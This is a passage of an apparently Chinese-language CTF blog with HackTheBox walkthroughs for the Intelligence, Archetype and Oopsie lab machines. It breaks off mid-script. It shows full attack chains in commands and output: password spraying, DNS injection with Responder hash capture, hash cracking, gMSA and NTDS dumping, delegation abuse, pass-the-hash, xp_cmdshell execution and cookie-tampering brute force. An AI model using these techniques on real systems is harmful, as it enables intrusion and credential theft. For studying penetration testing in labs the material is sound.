href="#端口扫描-14"></a> 端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.248</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.248</span><br><span class="line">Host is up (0.21s latency).</span><br><span class="line">Not shown: 988 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-18 12:54:48Z)</span><br><span class="line">135/tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-13"><a class="markdownIt-Anchor" href="#漏洞利用-13"></a> 漏洞利用</h2><p>访问80端口，可以看到主页上有两个PDF的链接</p><p>尝试枚举其他PDF</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pdf.py</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">13</span>):</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>):</span><br><span class="line">            year = <span class="built_in">str</span>(<span class="number">2020</span> + i)</span><br><span class="line">            month = (<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(j)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(j)) == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">str</span>(j)</span><br><span class="line">            day = (<span class="string">&quot;0&quot;</span> + <span class="built_in">str</span>(k)) <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">str</span>(k)) == <span class="number">1</span> <span class="keyword">else</span> <span class="built_in">str</span>(k)</span><br><span class="line">            url = <span class="string">&quot;http://10.10.10.248/documents/&quot;</span> + year + <span class="string">&quot;-&quot;</span> + month + <span class="string">&quot;-&quot;</span> + day + <span class="string">&quot;-upload.pdf&quot;</span></span><br><span class="line">            res = req.get(url)</span><br><span class="line">            <span class="keyword">if</span> res.status_code == <span class="number">200</span>:</span><br><span class="line">                filename = year + <span class="string">&quot;-&quot;</span> + month + <span class="string">&quot;-&quot;</span> + day + <span class="string">&quot;-upload.pdf&quot;</span></span><br><span class="line">                print(filename)</span><br><span class="line">                file = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">                file.write(res.content)</span><br></pre></td></tr></table></figure><p>获取PDF的用户名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#pdf.sh</span></span><br><span class="line">filelist=`ls *.pdf`</span><br><span class="line">filenum=`ls *.pdf|wc -l`</span><br><span class="line"><span class="keyword">for</span> ((i=1;i&lt;=<span class="variable">$filenum</span>;i++))</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">    filename[<span class="variable">$&#123;i&#125;</span>]=`ls *.pdf| sed -n <span class="variable">$&#123;i&#125;</span>p`</span><br><span class="line">    <span class="built_in">echo</span> `exiftool <span class="variable">$&#123;filename[<span class="variable">$&#123;i&#125;</span>]&#125;</span> | grep Creator | awk -F \  <span class="string">&#x27;&#123;print \$3&#125;&#x27;</span>` &gt;&gt; user</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p>从2020-06-04-upload.pdf中得到一个密码<code>NewIntelligenceCorpUser9876</code></p><p>爆破SMB</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.10.248 -d intelligence -u user -p NewIntelligenceCorpUser9876</span><br><span class="line"></span><br><span class="line">SMB         10.10.10.248    445    DC               [+] intelligence\Tiffany.Molina:NewIntelligenceCorpUser9876</span><br></pre></td></tr></table></figure><p>查看SMB路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence</span><br><span class="line"></span><br><span class="line">    Disk                                                    Permissions Comment</span><br><span class="line">    ----                                                    ----------- -------</span><br><span class="line">    ADMIN$                                              NO ACCESS   Remote Admin</span><br><span class="line">    C$                                                  NO ACCESS   Default share</span><br><span class="line">    IPC$                                                READ ONLY   Remote IPC</span><br><span class="line">    IT                                                  READ ONLY   </span><br><span class="line">    NETLOGON                                            READ ONLY   Logon server share </span><br><span class="line">    SYSVOL                                              READ ONLY   Logon server share </span><br><span class="line">    Users                                               READ ONLY</span><br></pre></td></tr></table></figure><p>获得user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.248/users -U Tiffany.Molina NewIntelligenceCorpUser9876</span><br><span class="line"><span class="built_in">cd</span> Tiffany.Molina\Desktop\</span><br><span class="line">get user.txt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br><span class="line"></span><br><span class="line">bbfd0948d53d769c6ec2fcc02181fa7b</span><br></pre></td></tr></table></figure><h2 id="权限提升-14"><a class="markdownIt-Anchor" href="#权限提升-14"></a> 权限提升</h2><p>获取powershell脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.10.248/IT -U Tiffany.Molina NewIntelligenceCorpUser9876</span><br><span class="line">get downdetector.ps1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">cat downdetector.ps1</span><br><span class="line"></span><br><span class="line"># Check web server status. Scheduled to run every 5min</span><br><span class="line">Import-Module ActiveDirectory </span><br><span class="line">foreach($record in Get-ChildItem &quot;AD:DC&#x3D;intelligence.htb,CN&#x3D;MicrosoftDNS,DC&#x3D;DomainDnsZones,DC&#x3D;intelligence,DC&#x3D;htb&quot; | Where-Object Name -like &quot;web*&quot;)  &#123;</span><br><span class="line">try &#123;</span><br><span class="line">$request &#x3D; Invoke-WebRequest -Uri &quot;http:&#x2F;&#x2F;$($record.Name)&quot; -UseDefaultCredentials</span><br><span class="line">if(.StatusCode -ne 200) &#123;</span><br><span class="line">Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125; catch &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪造域名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/dirkjanm/krbrelayx/master/dnstool.py</span><br><span class="line">python3 dnstool.py -u <span class="string">&quot;intelligence.htb\Tiffany.Molina&quot;</span> -p NewIntelligenceCorpUser9876 --action add -r webbufferfly.intelligence.htb -d 10.10.16.24 10.10.10.248</span><br></pre></td></tr></table></figure><p>获取账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br><span class="line"></span><br><span class="line">Ted.Graves::intelligence:a0ccbece497d44d6:5F06EFF458D65EF3D277BBEF99522C05:01010000000000006E002FBCEB7ED70155A10145AE3210F90000000002000800320041004400530001001E00570049004E002D00490056004200580046004E00320037003300340045000400140032004100440053002E004C004F00430041004C0003003400570049004E002D00490056004200580046004E00320037003300340045002E0032004100440053002E004C004F00430041004C000500140032004100440053002E004C004F00430041004C000800300030000000000000000000000000200000A9E570CA9FC3E890033A04EB61C9D3A383AF9C961FCC3E1B59979F2C02378B410A0010000000000000000000000000000000000009003E0048005400540050002F007700650062003100310034003500310034002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</span><br></pre></td></tr></table></figure><p>爆破Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt <span class="built_in">hash</span></span><br><span class="line"></span><br><span class="line">Mr.Teddy         (Ted.Graves)</span><br></pre></td></tr></table></figure><p>获得凭证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ted.Graves:Mr.Teddy</span><br></pre></td></tr></table></figure><p>获取Hash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py</span><br><span class="line">python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l 10.10.10.248</span><br><span class="line"></span><br><span class="line">svc_int$:::47e89a6afd68e3872ef1acaf91d0b2f7</span><br></pre></td></tr></table></figure><p>获取SPN</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/the-useless-one/pywerview</span><br><span class="line">python3 pywerview.py get-netcomputer -u svc_int$ --hashes 47e89a6afd68e3872ef1acaf91d0b2f7 -d intelligence.htb -t dc.intelligence.htb --full-data</span><br><span class="line"></span><br><span class="line">msds-allowedtodelegateto:       WWW/dc.intelligence.htb</span><br></pre></td></tr></table></figure><p>获取ST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate administrator</span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=administrator.ccache</span><br><span class="line">python3 secretsdump.py -k dc.intelligence.htb -just-dc</span><br><span class="line"></span><br><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:9075113fe16cf74f7c0f9b27e882dad3:::</span><br></pre></td></tr></table></figure><p>Hash登入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.248 -u administrator -H 9075113fe16cf74f7c0f9b27e882dad3</span><br><span class="line"><span class="built_in">type</span> c:\users\administrator\desktop\root.txt</span><br><span class="line"></span><br><span class="line">0c6b9779d283e244e79b11c78fc1fb92</span><br></pre></td></tr></table></figure><hr /><h1 id="hackthebox_archetype"><a class="markdownIt-Anchor" href="#hackthebox_archetype"></a> HackTheBox_Archetype</h1><p>Windows</p><h2 id="端口扫描-15"><a class="markdownIt-Anchor" href="#端口扫描-15"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.27</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.27</span><br><span class="line">Host is up (0.51s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE SERVICE      VERSION</span><br><span class="line">135/tcp  open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds</span><br><span class="line">1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-14"><a class="markdownIt-Anchor" href="#漏洞利用-14"></a> 漏洞利用</h2><p>用smbmap先扫描一波SMB服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27</span><br><span class="line">[+] IP: 10.10.10.27:445Name: 10.10.10.27</span><br></pre></td></tr></table></figure><p>随便加个用户名</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.10.27 -u <span class="built_in">test</span></span><br><span class="line">[+] Guest session   IP: 10.10.10.27:445Name: 10.10.10.27                                       </span><br><span class="line">        Disk                                                  PermissionsComment</span><br><span class="line">----                                                  ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">backups                                           READ ONLY</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br></pre></td></tr></table></figure><p>空密码即可登入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.27\\backups -U <span class="built_in">test</span></span><br><span class="line">Enter WORKGROUP\<span class="built_in">test</span><span class="string">&#x27;s password: </span></span><br><span class="line"><span class="string">Try &quot;help&quot; to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; dir</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string">  prod.dtsConfig                     AR      609  Mon Jan 20 20:23:02 2020</span></span><br><span class="line"><span class="string">  schtasks.txt                        A   174006  Fri Jun  4 12:05:57 2021</span></span><br><span class="line"><span class="string">  services.txt                        A     6370  Fri Jun  4 12:10:59 2021</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">10328063 blocks of size 4096. 8165400 blocks available</span></span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smb: \&gt; get prod.dtsConfig</span><br><span class="line">getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">DTSConfiguration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">DTSConfigurationFileInfo</span> <span class="attr">GeneratedBy</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageName</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedFromPackageID</span>=<span class="string">&quot;...&quot;</span> <span class="attr">GeneratedDate</span>=<span class="string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;</span>&quot;/&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">DTSConfigurationHeading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">ConfiguredType</span>=<span class="string">&quot;Property&quot;</span> <span class="attr">Path</span>=<span class="string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> <span class="attr">ValueType</span>=<span class="string">&quot;String&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ConfiguredValue</span>&gt;</span>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;<span class="tag">&lt;/<span class="name">ConfiguredValue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">DTSConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到MSSQL账户<code>ARCHETYPE\sql_svc:M3g4c0rp123</code></p><p>这里使用impacket来登入</p><p><a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p><p>可以执行系统命令</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27  -windows-auth</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to <span class="string">&#x27;master&#x27;</span>.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">SQL&gt; enable_xp_cmdshell</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;show advanced options&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option <span class="string">&#x27;xp_cmdshell&#x27;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt; xp_cmdshell whoami</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">archetype\sql_svc                                                                  </span><br><span class="line"></span><br><span class="line">NULL                                                                               </span><br><span class="line"></span><br><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\desktop\user.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">3e7b102e78218e935bf3f4951fec21a3</span><br></pre></td></tr></table></figure><h2 id="权限提升-15"><a class="markdownIt-Anchor" href="#权限提升-15"></a> 权限提升</h2><p><code>C:\users\sql_svc\appdata</code>为隐藏路径, 需要使用<code>dir /a</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; xp_cmdshell <span class="built_in">type</span> C:\users\sql_svc\appdata\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt</span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!            </span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span>                                                                               </span><br><span class="line"></span><br><span class="line">NULL</span><br></pre></td></tr></table></figure><p>通过查看powershell的历史记录得到administrator的账户</p><p><code>Archetype\administrator:MEGACORP_4dm1n!!</code></p><p>在使用<code>impacket</code>中的<code>psexec.py</code>来得到管理员权限的Shell</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py archetype/administrator@10.10.10.27</span><br><span class="line">Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.10.10.27.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file OFvCNrQJ.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.27.....</span><br><span class="line">[*] Creating service SMtb on 10.10.10.27.....</span><br><span class="line">[*] Starting service SMtb.....</span><br><span class="line">[!] Press <span class="built_in">help</span> <span class="keyword">for</span> extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;<span class="built_in">type</span> C:\users\administrator\desktop\root.txt</span><br><span class="line">b91ccec3305e98240082d4474b848528</span><br></pre></td></tr></table></figure><hr /><blockquote><p>尝试不使用psexec运行管理员权限命令的一波三折</p></blockquote><p>Windows下可以使用runas命令来以其他用户的身份运行命令<br />如<code>runas /savecred /user:administrator whoami</code><br />但是不能直接通过参数输入密码</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami</span><br><span class="line">试图将 whoami 作为用户 <span class="string">&quot;DOMAIN\administrator&quot;</span> 启动...</span><br><span class="line">输入 administrator 的密码:</span><br></pre></td></tr></table></figure><p>密码的输入需要以交互式的方式来输入, 就无法在MSSQL的非交互式Shell中直接提权</p><p>而可以使用sanur这个工具来进行密码的命令行输入</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator whoami | sanur.exe password</span><br></pre></td></tr></table></figure><p>但是紧接着问题又来了<br />runas貌似不会在当前cmd窗口运行命令而是在一个新的cmd中运行, 这样的话就不能在MSSQL的Shell中看到回显</p><p>所以尝试了文件写入保存命令运行结果的方法</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /savecred /user:administrator <span class="string">&quot;cmd /c whoami &gt; C:\1&quot;</span> | sanur.exe password</span><br></pre></td></tr></table></figure><p>本地运行成功了, 但是目标机器不行(无奈)</p><hr /><h1 id="hackthebox_oopsie"><a class="markdownIt-Anchor" href="#hackthebox_oopsie"></a> HackTheBox_Oopsie</h1><p>Linux</p><h2 id="端口扫描-16"><a class="markdownIt-Anchor" href="#端口扫描-16"></a> 端口扫描</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sT -Pn 10.10.10.28</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.28</span><br><span class="line">Host is up (0.68s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE   VERSION</span><br><span class="line">22/tcp open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open     http            Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h2 id="漏洞利用-15"><a class="markdownIt-Anchor" href="#漏洞利用-15"></a> 漏洞利用</h2><p>在首页的源码看到这样一条JS</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;/cdn-cgi/login/script.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>得到路径<code>/cdn-cgi/login</code></p><p>访问该路径即为登入页面<br />这里的登入需要使用上一台靶机的Administrator密码, 有点坑<br /><code>admin:MEGACORP_4dm1n!!</code></p><p>访问<code>/cdn-cgi/login/admin.php?content=uploads</code><br />提示<code>This action require super admin rights.</code><br />且<code>Cookie</code>中的内容为<code>user=34322; role=admin</code><br />那么只要能够得到<code>super admin</code>的<code>id</code>值与<code>username</code>即可越权</p><p><code>/cdn-cgi/login/admin.php?content=accounts&amp;id=1</code><br />访问该路径可以得到<code>admin</code>的账户信息<br />可以通过爆破参数<code>id</code>来得到<code>super admin</code>的信息</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line">headers = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;user=34322; role=admin&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">999</span>):</span><br><span class="line">    url = <span 